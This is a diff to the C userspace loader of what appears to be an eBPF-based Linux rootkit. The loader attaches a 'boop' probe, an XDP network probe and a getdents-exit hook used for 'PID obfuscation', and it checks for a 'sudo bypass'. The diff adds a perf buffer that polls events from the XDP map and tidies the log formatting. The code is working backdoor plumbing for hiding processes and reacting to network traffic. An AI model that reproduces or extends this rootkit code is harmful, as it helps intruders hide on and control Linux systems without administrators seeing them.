@@ -28,6 +28,7 @@
 #include <bpf/libbpf.h>
 #include <errno.h>
 #include <limits.h>
+#include <linux/perf_event.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -170,6 +171,13 @@ static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
   return 0;
 }
 
+static enum bpf_perf_event_ret handle_perf_event(void *private_data,
+                                                 int cpu,
+                                                 struct perf_event_header *event){
+  printf(".");
+  return LIBBPF_PERF_EVENT_CONT;
+}
+
 void rootcheck(int argc, char **argv) {
   long luid = (long)getuid();
   boopprintf("  -> getuid()  : %ld\n", luid);
@@ -200,6 +208,20 @@ void rootcheck(int argc, char **argv) {
     boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
   }
 }
+
+struct perf_handler_ctx {
+  uint64_t                 missed_events;
+  uint64_t                 last_missed_events;
+  uint64_t                 captured_packets;
+  uint64_t                 epoch_delta;
+  uint64_t                 packet_id;
+  uint64_t                 cpu_packet_id[MAX_CPUS];
+//  struct dumpopt          *cfg;
+//  struct capture_programs *xdp_progs;
+//  pcap_t                  *pcap;
+//  pcap_dumper_t           *pcap_dumper;
+//  struct xpcapng_dumper   *pcapng_dumper;
+};
 
 /**
  * main
@@ -239,14 +261,14 @@ int main(int argc, char **argv) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
       return 1;
     }
-    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    boopprintf("  ->   eBPF Probe Loaded         : %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(xdpobj, NULL);
     bpf_object__for_each_program(xdpprog, xdpobj) {
-      boopprintf("  -> -> eBPF Program Address: %p\n", xdpprog);
+      boopprintf("  ->   eBPF Program Address      : %p\n", xdpprog);
       const char *progname = bpf_program__name(xdpprog);
-      boopprintf("  -> -> eBPF Program Name: %s\n", progname);
+      boopprintf("  ->   eBPF Program Name         : %s\n", progname);
       const char *progsecname = bpf_program__section_name(xdpprog);
-      boopprintf("  -> -> eBPF Program Section Name: %s\n", progsecname);
+      boopprintf("  ->   eBPF Program Section Name : %s\n", progsecname);
       struct bpf_link *link = bpf_program__attach(xdpprog);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", xdpprog);
@@ -282,7 +304,7 @@ int main(int argc, char **argv) {
       boopprintf("Permission denied.\n");
       return 1;
     }
-    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0besafepath);
+    boopprintf("  ->   eBPF Probe Loaded         : %s\n", cfg.pr0besafepath);
     int index = PROG_01;
     int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
     int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
@@ -332,14 +354,14 @@ int main(int argc, char **argv) {
       boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
       return 1;
     }
-    boopprintf("  -> -> eBPF Probe loaded: %s\n", cfg.pr0bebooppath);
+    boopprintf("  ->   eBPF Probe Loaded         : %s\n", cfg.pr0bebooppath);
     bpf_object__next_map(bpobj, NULL);
     bpf_object__for_each_program(program, bpobj) {
-      boopprintf("  -> -> eBPF Program Address: %p\n", program);
+      boopprintf("  ->   eBPF Program Address      : %p\n", program);
       const char *progname = bpf_program__name(program);
-      boopprintf("  -> -> eBPF Program Name: %s\n", progname);
+      boopprintf("  ->   eBPF Program Name         : %s\n", progname);
       const char *progsecname = bpf_program__section_name(program);
-      boopprintf("  -> -> eBPF Program Section Name: %s\n", progsecname);
+      boopprintf("  ->   eBPF Program Section Name : %s\n", progsecname);
       struct bpf_link *link = bpf_program__attach(program);
       if (!link) {
         boopprintf("Unable to link eBPF program: %s\n", progname);
@@ -353,17 +375,32 @@ int main(int argc, char **argv) {
 
 
   // ===========================================================================
-  // Boop eBPF Map
-  //
-  // We (by design) only have a single map for the boop object!
-  // Therefore, we can call next_map() with NULL and get the first
-  // map from the probe.
+  // [maps]
   struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
-  const char *mapname = bpf_map__name(bpmap);
-  boopprintf("  -> -> eBPF Map Name: %s\n", mapname);
+  const char *bmapname = bpf_map__name(bpmap);
+  boopprintf("  ->   eBPF Map Name: %s\n", bmapname);
   int fd = bpf_map__fd(bpmap);
-  boopprintf("  -> -> eBPF Program Linked!\n");
 
+  struct bpf_map *xdpmap = bpf_object__next_map(xdpobj, NULL);
+  const char *xdpmapname = bpf_map__name(xdpmap);
+  boopprintf("  ->   eBPF Map Name: %s\n", xdpmapname);
+  int xfd = bpf_map__fd(xdpmap);
+
+  struct perf_buffer          *perf_buf = NULL;
+  struct perf_event_attr       perf_attr = {
+      .sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TIME,
+      .type = PERF_TYPE_SOFTWARE,
+      .config = PERF_COUNT_SW_BPF_OUTPUT,
+      .sample_period = 1,
+      .wakeup_events = 1,
+  };
+
+  // XDP Perf Buffer
+  struct perf_buffer_raw_opts  perf_opts = {};
+  struct perf_handler_ctx      perf_ctx;
+  perf_opts.attr = &perf_attr;
+  perf_opts.event_cb = handle_perf_event;
+  perf_opts.ctx = &perf_ctx;  perf_buf = perf_buffer__new_raw(xfd, PERF_MMAP_PAGE_COUNT, &perf_opts);
 
   // Logs
   for (int i = 0; i < cfg.denyc; i++) {
@@ -381,7 +418,9 @@ int main(int argc, char **argv) {
   //
   int ignore = 0;
   while (1) {
-    err = ring_buffer__poll(rb, 100); // Ignore events!
+    ring_buffer__poll(rb, 100); // Ignore errors!
+    perf_buffer__poll(perf_buf, 100); // Ignore errors!
+
     int ikey = 0, jkey;
     int err;
     char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
